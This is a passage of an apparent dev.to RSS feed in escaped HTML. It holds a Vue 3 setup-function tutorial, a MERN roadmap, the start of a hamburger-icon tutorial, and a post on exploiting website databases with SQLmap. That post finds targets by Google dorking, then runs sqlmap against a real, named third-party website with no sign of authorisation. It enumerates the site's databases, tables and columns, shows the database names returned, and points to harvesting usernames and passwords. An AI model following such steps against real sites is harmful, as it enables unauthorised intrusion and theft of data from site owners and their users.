   &lt;span class="c1"&gt;//anything returned from setup function will be&lt;/span&gt;
   &lt;span class="c1"&gt;//available throughout our component&lt;/span&gt;
   &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;{};&lt;/span&gt;
   &lt;span class="p"&gt;},&lt;/span&gt;
   &lt;span class="c1"&gt;//return object from setup function accessible here&lt;/span&gt;
   &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#setup-function-in-composition-api-arguments"&gt;
  &lt;/a&gt;
  Setup function in Composition API ‚Äî Arguments
&lt;/h2&gt;

&lt;p&gt;Setup function has two arguments,&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;props&lt;/li&gt;
&lt;li&gt;context
Let‚Äôs see how these arguments are being used in the components.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#props"&gt;
  &lt;/a&gt;
  Props
&lt;/h2&gt;

&lt;p&gt;Props are the first argument of setup functions, which are reactive by nature. So while we update the props, the component will be updated. The basic example as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#props-with-es6-destructive"&gt;
  &lt;/a&gt;
  Props with ES6 Destructive
&lt;/h2&gt;

&lt;p&gt;Note that props are reactive by default. So we can not use Object destructuring since it will remove reactive property. We can solve such problems using toRefs. toRefs is useful when the reactive objects are being destructured/spread.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;toRef&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;vue&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;toRefs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that, if the label is an optional prop, then toRefs will not create a reactive reference for the label. Here we are in need to use toRef instead of toRefs. Let me show the same with the below example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;toRefs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;label&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#context"&gt;
  &lt;/a&gt;
  Context
&lt;/h2&gt;

&lt;p&gt;Context is the second argument of the setup function which is not reactive by nature. This is the normal JavaScript object. It has three component properties:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;attrs ‚Äî Attributes (Non-Reactive)&lt;/li&gt;
&lt;li&gt;slots ‚Äî Slots (Non-Reactive)&lt;/li&gt;
&lt;li&gt;emit ‚Äî Method (Emit events)
&lt;/li&gt;
&lt;/ol&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;attrs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;// non reactive&lt;/span&gt;

&lt;span class="nx"&gt;consoole&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slots&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;// non reactive&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;// emit events&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that context is not reactive. So we can use Object destructuring here as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;attrs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;slots&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;emit&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;//write logics here&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#setup-function-with-template"&gt;
  &lt;/a&gt;
  Setup function with Template
&lt;/h2&gt;

&lt;p&gt;Properties of props and anything returned from the setup function will be accessible in the component‚Äôs template. Let me explain with the below example:&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#custombuttonvue"&gt;
  &lt;/a&gt;
  CustomButton.vue
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;template&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;div&amp;gt;&lt;/span&gt;{{counterMsg.msg}}.{{counter}}&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="na"&gt;click=&lt;/span&gt;&lt;span class="s"&gt;"()=&amp;gt; counter++"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/template&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;reactive&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;vue&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;//props properties accessible to template&lt;/span&gt;
        &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;counter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;counterMsg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;reactive&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;click the button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
            &lt;span class="c1"&gt;// object accessible to templates&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;counter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nx"&gt;counterMsg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above example counter, counterMsg are from setup function and label from props which are accessible in the template. Note that when we access the ref inside the template, it will unwrap the inner value automatically. No need to append .value in the template.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setup-function-with-render-raw-h-endraw-"&gt;
  &lt;/a&gt;
  Setup function with render &lt;code&gt;{ h }&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;As same as with the template, we can use setup with render functions also. Here we will be using h instead of template in the component. Let me explain with the below example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;reactive&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;h&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;vue&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;//props properties accessible to template&lt;/span&gt;
&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;props&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nx"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;counter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;counterMsg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;reactive&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;click the button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
        &lt;span class="c1"&gt;// Note that we have to give  ref value in render function&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
            &lt;span class="nx"&gt;h&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="na"&gt;onClick&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;counter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
                &lt;span class="nx"&gt;props&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;
            &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above example, the same component has been implemented using the render function. We can convert our template into render function (h) using Template Compilation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;So we have learned about setup functions today. Composition API is the fundamental concept of Vue3. The ultimate goal of composition API is to organize the complex component logics in a single place. Typically the place is nothing but the setup function. Another important point is this won‚Äôt be available here unlike other options in the component.&lt;/p&gt;

</description>
      <category>vue</category>
      <category>javascript</category>
      <category>codenewbie</category>
      <category>100daysofcode</category>
    </item>
    <item>
      <title>Exploit Website Databases Using SQLmap</title>
      <author>Hafiz Muhammad Attaullah</author>
      <pubDate>Sat, 05 Jun 2021 17:17:47 +0000</pubDate>
      <link>https://dev.to/attaullahshafiq10/exploit-website-databases-using-sqlmap-46f0</link>
      <guid>https://dev.to/attaullahshafiq10/exploit-website-databases-using-sqlmap-46f0</guid>
      <description>&lt;p&gt;üé© Exploit Website Databases Using SQLmap üé©&lt;/p&gt;

&lt;p&gt;‚ú®SQLmap is one of the most famous tools for SQL injection. It is pre-installed in Kali Linux so no need to download it from anywhere.&lt;/p&gt;

&lt;p&gt;What is a SQL injection attack‚ùì&lt;/p&gt;

&lt;p&gt;‚ú®SQLi is a common attack where the attacker injects and executes malicious SQL requests in order to get hold of the web databases. These attacks are common in vulnerable websites that use SQL RDBMS to store databases&lt;/p&gt;

&lt;p&gt;So today we'll perform an SQLi attack on a vulnerable website&lt;/p&gt;

&lt;p&gt;‚úÖ Requirements&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏èKali&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏èKnowledge on Google Dorking&lt;/p&gt;

&lt;p&gt;‚úÖ Steps&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏è Google Dork vulnerable websites&lt;/p&gt;

&lt;p&gt;First of all we have to get a vulnerable website to perform the attack. So we'll use Google Dorking. In simple words, it means that using Google search engine, we can use some special codes in order to get some security holes in websites. Here I'm gonna use this Dork to get SQLi vulnerable websites&lt;/p&gt;

&lt;p&gt;inurl:index.php?id=&lt;/p&gt;

&lt;p&gt;This will have many results. I've chosen the following website&lt;/p&gt;

&lt;p&gt;&lt;a href="http://www.asfaa.org/members.php?id=1"&gt;http://www.asfaa.org/members.php?id=1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏è Get the vulnerability of the website&lt;/p&gt;

&lt;p&gt;To get the vulnerability, I'll use the following trick&lt;/p&gt;

&lt;p&gt;Add 1 with Asterix * and reload the website&lt;/p&gt;

&lt;p&gt;&lt;a href="http://www.asfaa.org/members.php?id=1*"&gt;http://www.asfaa.org/members.php?id=1*&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When the website shows error, it means that it's vulnerable&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏è Fire up Sqlmap üî•&lt;/p&gt;

&lt;p&gt;Open terminal. Then type there&lt;/p&gt;

&lt;p&gt;sqlmap -u yoururl&lt;/p&gt;

&lt;p&gt;‚ö†Ô∏èMake sure to replace the Asterix with the original value and give the full URL&lt;/p&gt;

&lt;p&gt;In my case, I typed&lt;/p&gt;

&lt;p&gt;sqlmap -u &lt;a href="http://www.asfaa.org/members.php?id=1"&gt;http://www.asfaa.org/members.php?id=1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It'll start injecting malicious SQL requests. Once done, you'll notice the changes&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏è Exploit databases&lt;/p&gt;

&lt;p&gt;Now we need to type the next command&lt;/p&gt;

&lt;p&gt;sqlmap -u yoururl --dbs&lt;/p&gt;

&lt;p&gt;When I did it in my case, I received the following databases&lt;/p&gt;

&lt;p&gt;information_schema&lt;br&gt;
db83231_acolop&lt;br&gt;
db83231_asfaa&lt;/p&gt;

&lt;p&gt;‚≠ïÔ∏è Extract the tables and columns&lt;/p&gt;

&lt;p&gt;Now, you can extract the tables of any of the databases using the command&lt;/p&gt;

&lt;p&gt;sqlmap -u yoururl -D databasename --tables&lt;/p&gt;

&lt;p&gt;For columns,&lt;/p&gt;

&lt;p&gt;sqlmap -u yoururl -D databasename -T tablename --columns&lt;/p&gt;

&lt;p&gt;I did the following&lt;/p&gt;

&lt;p&gt;sqlmap -u &lt;a href="http://www.asfaa.org/members.php?id=1"&gt;http://www.asfaa.org/members.php?id=1&lt;/a&gt; -D db83231_asfaa --tables&lt;/p&gt;

&lt;p&gt;sqlmap -u &lt;a href="http://www.asfaa.org/members.php?id=1"&gt;http://www.asfaa.org/members.php?id=1&lt;/a&gt; -D db83231_asfaa -T members --columns&lt;/p&gt;

&lt;p&gt;And I got lots of results ‚ùóÔ∏è&lt;/p&gt;

&lt;p&gt;‚ÑπÔ∏è One main advantage of SQLi is that some websites store usernames and passwords in SQL databases that can be exploited.&lt;/p&gt;

&lt;p&gt;Hafiz Muhammad Attaullah&lt;/p&gt;

</description>
      <category>sql</category>
      <category>cybersecurity</category>
      <category>security</category>
    </item>
    <item>
      <title>Roadmap to Become a MERN Stack developer</title>
      <author>rafikadir</author>
      <pubDate>Sat, 05 Jun 2021 17:10:57 +0000</pubDate>
      <link>https://dev.to/rafikadir/roadmap-to-become-a-mern-stack-developer-3mf9</link>
      <guid>https://dev.to/rafikadir/roadmap-to-become-a-mern-stack-developer-3mf9</guid>
      <description>&lt;p&gt;MERN stands for MongoDB, Express, ReactJS, and NodeJS. MERN stack is one of the powerful and demandable stacks in Javascript.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Follow the steps below to become a MERN  developer:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Learn HTML &amp;amp; CSS - HTML for markup and CSS for design.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Then you have to learn JavaScript - Javascript for dynamic functionality in web applications. If you learn Javascript you can develop the front end and back end also. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;After learning Javascript you should learn DOM - It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Start learning ReactJS: React is a front-end javascript library. &lt;br&gt;
Next step to learn Node JS with express framework.&lt;br&gt;
After learning the node you can start learning MongoDB &lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Congratulation ! you are now a MERN stack developer. &lt;/p&gt;

&lt;p&gt;So, what after you have learned MERN stack development. Look you have learned only the basics now.  You can start making some small projects. Then gradually start learning advance and make intermediate project also Portfolio website.&lt;/p&gt;

&lt;p&gt;Next post I will share some tools that need to know as a developer.&lt;/p&gt;

</description>
      <category>react</category>
      <category>javascript</category>
      <category>node</category>
      <category>mongodb</category>
    </item>
    <item>
      <title>Hamburger Icon</title>
      <author>Dezigner Bay</author>
      <pubDate>Sat, 05 Jun 2021 17:04:35 +0000</pubDate>
      <link>https://dev.to/baydezigner/hamburger-icon-18j6</link>
      <guid>https://dev.to/baydezigner/hamburger-icon-18j6</guid>
      <description>&lt;p&gt;&lt;a href="https://youtu.be/YURgKce25Ig"&gt;Demo&lt;/a&gt;&lt;br&gt;
Hi guys, in this short tutorial, you're going to learn how to create a Hamburger Icon with HTML,CSS and JavaScript.&lt;/p&gt;

&lt;p&gt;The hamburger menu icon can also be referred to as a &lt;strong&gt;Three-line menu, a Menu button, or a Hotdog menu&lt;/strong&gt;. The hamburger icon is very useful for responsive designing or mobile views with smaller screen sizes. The icon which is consisting of three horizontal bars. Its function is to toggle a menu or navigation etc. &lt;/p&gt;

&lt;p&gt;It is easy to create this hamburger menu icon with only &lt;code&gt;HTML&lt;/code&gt;,&lt;code&gt;CSS&lt;/code&gt; and &lt;code&gt;JavaScript&lt;/code&gt;. OK let's start then.&lt;/p&gt;

&lt;p&gt;At first create a index.html page. Today I am going to create a hamburger icon with two horizontal bars but when you've learned this, I hope you'll try making a three-bar hamburger icon.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;index.html&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
